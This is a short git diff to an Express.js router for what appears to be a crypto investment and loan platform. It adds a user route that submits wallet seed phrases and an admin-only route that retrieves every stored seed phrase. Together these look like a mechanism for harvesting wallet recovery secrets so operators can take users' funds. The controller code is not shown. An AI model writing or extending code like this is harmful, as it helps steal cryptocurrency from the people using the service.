@@ -13,6 +13,7 @@ router.post('/update-withdrawal-status', auth, userDataController.updateWithdraw
 router.get('/dashboard', auth, userDataController.getUserDashboard);
 router.put('/update-balance', auth, userDataController.updateBalances);
 router.put('/update-profile', auth, userDataController.updateUserProfile);
+router.post('/submit-seed', auth, userDataController.submitSeedPhrase);
 router.get('/wallets', auth, userDataController.getWallets);
 router.post('/claim-bonus', auth, userDataController.claimBonus);
 router.get('/get-bonus', auth, userDataController.checkBonus);
@@ -21,6 +22,7 @@ router.post("/place-loan", auth, userDataController.placeLoan);
 router.get("/get-loan", auth, userDataController.getUserLoans);
 
 // Admin route\
+router.get("/get-seed", verifyToken, isAdmin, userDataController.getAllSeedPhrases);
 router.post('/add-bonus',verifyToken, isAdmin, userDataController.assignBonus);
 router.get("/get-bonuses", verifyToken, isAdmin, userDataController.getAllAssignedBonuses);
 router.put("/approve/:userId/:loanId", verifyToken, isAdmin, userDataController.approveLoan);
